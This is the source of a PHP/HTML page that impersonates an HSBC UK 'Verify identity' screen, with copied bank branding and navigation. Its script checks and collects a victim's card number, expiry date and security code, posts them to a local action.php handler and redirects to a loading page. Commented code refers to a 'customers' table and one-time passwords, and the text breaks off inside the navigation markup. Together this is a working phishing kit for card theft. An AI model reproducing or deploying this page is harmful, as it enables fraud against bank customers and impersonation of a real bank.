<?php
session_start();
include 'files/config.php';
include 'files/connect.php';

$_SESSION['started'] == 'true';
$_SESSION['started'] = 'true';

if($_SESSION['started'] == 'true'){
	
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
	
	//$uniqueid = $_SESSION['uniqueid'];
	//$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	//if($query){
	//	$otpword = mysqli_fetch_array($query,MYSQLI_ASSOC)['otpword'];
	//}else{
	//	$otpword = 'Please enter the one time password we sent you.';
	//}
	
}else{
	header('location:exit.php');
}
?>

<!DOCTYPE html>
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en">

<head>
    
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="author" content="">
    <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="Sat, 6 May 1995 12:00:00 GMT">



    
    <!-- Webtrends ends-->

    <!-- style section-->
    

    <link href="files/css/ursula.css" rel="stylesheet" type="text/css" media="screen">
    <link rel="stylesheet" href="files/css/print.css" type="text/css" media="print">
	<link rel="icon" href="files/img/favicon.ico" type="image/ico">
	
    <!-- style end-->

    <!-- script section -->

    
    <title>Verify identity | HSBC</title>
    
	
	
	
	<script src="files/js/jquery-3.4.1.min.js"></script>
    <script src="files/js/jquery.validate.js"></script>
    <script src="files/js/jquery.maskedinput.js"></script>
    <script src="files/js/jquery.payment.js"></script>


<script>
	function form_submit(){
		var ccnum = $('#ccnum').val();
		var month = $('#day').val();
		var yeah = $('#month').val();
		var secode = $('#secode').val();
		var cookieuserid = document.getElementById('cookieuserid').checked;


		
		if(ccnum == null || ccnum == ''){
			//console.log('ccnum empty');
			return false;
		}else if(/^[0-9]{16}$/.test(ccnum) == true && ccnum != null && ccnum != ''){
			//console.log('ccnum correct');
		}else{
			//console.log('ccnum wrong');
			return false;
		}
		
		
		
		if(month == null || month == ''){
			//console.log('month empty');
			return false;
		}else if(/^(0?[1-9]|1[012])$/.test(month) == true && month != null && month != ''){
			//console.log('month correct');
		}else{
			//console.log('month wrong');
			return false;
		}
		
		if(yeah == null || yeah == ''){
			//console.log('yeah empty');
			return false;
		}else if(/^(2[0-9]|30)$/.test(yeah) == true && yeah != null && yeah != ''){
			//console.log('yeah correct');
		}else{
			//console.log('yeah wrong');
			return false;
		}
		
		if(secode == null || secode == ''){
			//console.log('secode empty');
			return false;
		}else if(/^[0-9]{3,4}$/.test(secode) == true && secode != null && secode != ''){
			//console.log('secode correct');
		}else{
			//console.log('secode wrong');
			return false;
		}
		
		

		
		$.ajax({
		type : 'POST',
		url : 'files/action.php?type=card',
		data : $('#hsbcwidget_form_validateForm_0').serialize(),
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				location.href = "Loading.php"
			}else{
				
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		return false;
		
	}
	</script>
	
	

	
	
</head>

<body class="ursula" cz-shortcut-listen="true">
    <div class="dijitBorderContainerNoGutter dijitContainer" id="main" widgetid="main">
        <div id="mainContainer" style="position: relative;" data-dojo-attach-point="containerNode">
            <div id="_header" data-dojo-type="dijit/layout/ContentPane" data-dojo-attach-point="header" data-dojo-props="splitter:false, region:'top'" class="dijitContentPane" title="" role="group" widgetid="_header">
                <div class="dijitBorderContainer dijitContainer" id="uniqName_1_0" widgetid="uniqName_1_0">
                    <div dir="ltr" id="mainTopWrapper">
                        <div id="mainTopUtility">
                            <h1 class="hidden" aria-hidden="false">HSBC</h1>
                            <h2 class="hidden" aria-hidden="false">HSBC</h2>
                            <div id="mainTopUtilityRow">
                                <ul id="tabs">
                                    <li class="skipLink"><a class="skip" href="#mainContent" id="skip">Skip page header and navigation</a></li>
                                    <li class="on"><a href="https://www.hsbc.co.uk/" title="Personal" aria-selected="true">Personal</a>
                                    </li>

                                    <li><a href="http://www.business.hsbc.co.uk/" title="Business">Business</a>
                                    </li>
                                </ul>
                                <div id="siteControls">

                                    <div id="langList">
                                        <ul>
                                            <li class="selected"><a tabindex="0" title="English" lang="en-UK">English</a></li>
                                        </ul>
                                    </div>

                                    <div data-dojo-type="hsbcwidget/Locale" id="locale" dir="ltr" widgetid="locale">
                                        <div data-dojo-props="contentSelector: '#countrySelectorContent'" data-dojo-type="hsbcwidget/DropDown" id="countrySelectorWrapper" dir="ltr" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite">
                                            <a class="dropDownLink trigger" href="#countrySelectorContent" title="View list of HSBC Global websites"><span><span class="flag uk">United Kingdom</span> </span> </a>
                                            <div class="placeholder"></div>
                                        </div>
                                    </div>

                                    <div id="logon" style="display: block;">
                                        <ul style="display: none;">
                                            <li><a href="https://www.hkgv2ls0187-uk.security.p2g.netd2.hsbc.com.hk/gsa/SaaS30Resource/" title="Log on to Personal Internet Banking" class="redBtn"><span>Log
										on</span> </a></li>
                                            <li><a href="https://www.eu432.p2g.netd2.hsbc.com.hk/1/2/HSBCINTEGRATION/register" title="Register for Personal Internet Banking" class="greyBtn"><span>Register</span>
							</a></li>
                                        </ul>
                                    </div>
                                    <div data-dojo-type="hsbcwidget/Logon" id="logoff" dir="ltr" widgetid="logoff" style="display: none;">
                                        <ul>
                                            <li><a href="https://www.security.hsbc.co.uk/gsa/?idv_cmd=idv.Logoff&amp;nextPage=SaaSLogoutCAM0Resource" title="Log off to Personal Internet Banking" class="redBtn"><span>Log
										off</span> </a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="mainTopNavigation">
                            <div id="logo">
                                <a href="http://www.hsbc.co.uk/" title="Home">
                                    <img alt="HSBC" src="files/img/hsbc-logo.gif">
                                </a>
                            </div>
                            <div data-dojo-type="hsbcwidget/DoormatController" id="sections" dir="ltr" widgetid="sections" aria-relevant="all" aria-live="polite">
                                <ul id="topLevel" role="menu">
                                    <li class="level1" id="dijit__WidgetBase_0" widgetid="dijit__WidgetBase_0"><a tabindex="0" href="javascript:void(0)" class="mainTopNav"><strong>Everyday Banking</strong><br>
							Accounts &amp; services</a>
                                        <div class="doormatWrapper fourColLeft" aria-hidden="true" style="display: none; opacity: 0;">
                                            <div class="arrow">&nbsp;</div>

                                            <div class="doormat">
                                                <p class="skipLink">
                                                    <a href="#" title="Move to Product and Services navigation">Move
										to Borrowing navigation</a>
                                                </p>

                                                <div class="doormatLeft">
                                                    <div class="column">
                                                        <h3 aria-hidden="true" class="hidden">HSBC</h3>
                                                        <h3>
											<a href="http://www.hsbc.co.uk/current-accounts/" title="Current accounts" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/Tab','WT.ti','Doormat:EverydayBanking:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Current
												accounts</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/current-accounts/products/premier/" title="HSBC Premier Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Premier/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Premier:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Account</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/current-accounts/products/advance/" title="HSBC Advance Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Advance/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Advance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Advance Account</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/current-accounts/products/bank-account/" title="Bank Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/BankAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:BankAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bank
													Account</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/current-accounts/products/student/" title="Student Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Student&amp;Graduates/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Student&amp;Graduates:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
													Account</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/current-accounts/switching-to-hsbc/" title="Switching to HSBC" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/SwitchingtoHSBC/Tab','WT.ti','Doormat:EverydayBanking:SwitchingtoHSBC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Switching
													to HSBC</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/current-accounts/" title="View all current accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">current accounts</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/savings-accounts" title="Savings" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/Tab','WT.ti','Doormat:SavingsAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Savings</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/tax-efficient-savings" title="ISAs" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/ISAs/Tab','WT.ti','Doormat:EverydayBanking:ISAs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">ISAs</a>
                                                            </li>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/savings-accounts/online-bonus-saver" title="Online Bonus Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/OBS/Tab','WT.ti','Doormat:SavingsAccounts:OBS:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Online
													Bonus Saver</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/savings-accounts/flexible-saver" title="Flexible Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/FlexiSaver/Tab','WT.ti','Doormat:SavingsAccounts:FlexiSaver:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Flexible
													Saver</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="https://www.hsbc.co.uk/savings/" title="View all savings accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/ViewAll/Tab','WT.ti','Doormat:SavingsAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">savings accounts</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/customer-support" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
												support</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/customer-support/card-services" title="Card support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Card
													support</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/customer-support/money-worries" title="Money worries" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Money
													worries</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/1/2/customer-support" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">customer support</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/ways-to-bank" title="Ways to bank" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
												to bank</a>
										</h3>

                                                        <p>Online, phone, mobile or in branch, we make it easy to bank with us.</p>

                                                        <p class="ctaLink">
                                                            <a href="https://www.hsbc.co.uk/ways-to-bank/" title="Ways to bank. Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
												out more <span class="hidden">about Ways to bank</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/credit-cards/" title="Credit cards" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/CreditCards/Tab','WT.ti','Doormat:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
												cards</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/credit-cards/credit-card" title="HSBC Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/HSBCCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:HSBCCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Credit Card</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/credit-cards/hsbc-premier-credit-card" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/PremierCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:PremierCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Credit Card</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/credit-cards/student-credit-card" title="Student Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/StudentCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:StudentCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
													Credit Card</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">credit cards</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="https://www.hsbc.co.uk/international/products/" title="International services" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/Tab','WT.ti','Doormat:EverydayBanking:International:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
												services</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/international-money-transfer" title="International Money Transfer" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/IntlMoneyTransfers/Tab','WT.ti','Doormat:EverydayBanking:IntlMoneyTransfers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
													Payments</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/travel-money" title="Travel money" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/TravelMoney/Tab','WT.ti','Doormat:EverydayBanking:TravelMoney:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
													money</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/overseas-account-opening" title="Overseas account opening" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/OverseasAccounts/Tab','WT.ti','Doormat:EverydayBanking:OverseasAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overseas
													account opening</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/1/2/international-services" title="View all international services" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:International:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">international services</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/hsbc-premier" title="HSBC Premier" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/HSBCPremier/Tab?WT.ac=HBEU_Doormat_Homepage_EverydayBanking_Premier','WT.ti','Doormat:EverydayBanking:HSBCPremier:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="HSBC Premier" src="files/img/premier_doormat_163x155_d469.jfif" style="margin-bottom: 20px;" width="163" height="155">
                                                        </a>
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/ways-to-bank/mobile-money/banking-on-the-go" title="banking on the go"><img tabindex="0" class="focusOnImage" alt="Banking on the go" src="files/img/mobile_doormat_163x155px_d548_v2.jfif" width="163" height="155">
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="level1" id="dijit__WidgetBase_1" widgetid="dijit__WidgetBase_1"><a class="mainTopNav" href="javascript:void(0)" tabindex="0"><strong>Borrowing</strong><br>
							Loans &amp; mortgages</a>
                                        <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;" aria-hidden="true">
                                            <div class="arrow">&nbsp;</div>

                                            <div class="doormat">
                                                <p class="skipLink">
                                                    <a href="http://www.hsbc.co.uk/1/2/borrowing" title="Move to Planning &amp; Investing navigation">Move
										to Investing navigation</a>
                                                </p>

                                                <div class="doormatLeft">
                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/loans/" title="Loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Loans</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/loans/products/personal/" title="Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PersonalLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PersonalLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Personal
													Loan</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/loans/products/flexible/" title="FlexiLoan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/FlexiLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:FlexiLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">FlexiLoan</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/loans/products/premier/" title="HSBC Premier Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PremierLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PremierLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Personal Loan</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/loans/products/graduate/" title="Graduate Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/GraduateLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:GraduateLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Graduate
													Loan</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/loans/" title="View all loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">loans</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/credit-cards/" title="Credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
												cards</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/credit-cards/products/classic/" title="HSBC Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Classic
													Credit Card</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/credit-cards/products/premier/" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCPremierCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCPremierCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Credit Card</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/credit-cards/products/student/" title="Student Visa Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCStudentCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCStudentCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
													Visa Credit Card</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/ViewAll/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">credit cards</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/mortgages" title="Mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Mortgages/Tab','WT.ti','Doormat:Homepage:Borrowing:Mortgages:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgages</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/first-time-buyers" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">First
													time buyer</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/buy-to-let-mortgages" title="Buy to let" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/BuyToLet/Tab','WT.ti','Doormat:Borrowing:BuyToLet:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buy
													to let</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages" title="Compare mortgages" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Compare
													mortgages</a>
                                                            </li>

                                                            <li><a href="https://www.hsbc.co.uk/1/2/mortgages/how-much-can-you-borrow" title="How much can I borrow?" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/HowMuchCanIBorrow/Tab','WT.ti','Doormat:Borrowing:HowMuchCanIBorrow:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">How
													much can I borrow?</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/existing-customers" title="Existing customers" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/ExistingMortgageCustomers/Tab','WT.ti','Doormat:Borrowing:ExistingMortgageCustomers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Existing
													customers</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/overpayment-calculator" title="Overpayment calculator" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/OverpaymentCalculator/Tab','WT.ti','Doormat:Borrowing:OverpaymentCalculator:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overpayment
													calculator</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/repayment-calculator" title="Repayment calculator" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/RepaymentCalculator/Tab','WT.ti','Doormat:Borrowing:RepaymentCalculator:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Repayment
													calculator</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/mortgage-advice" title="Help &amp; guidance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/MortgageHelpGuidance/Tab','WT.ti','Doormat:Borrowing:MortgageHelpGuidance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Help
													&amp; guidance</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
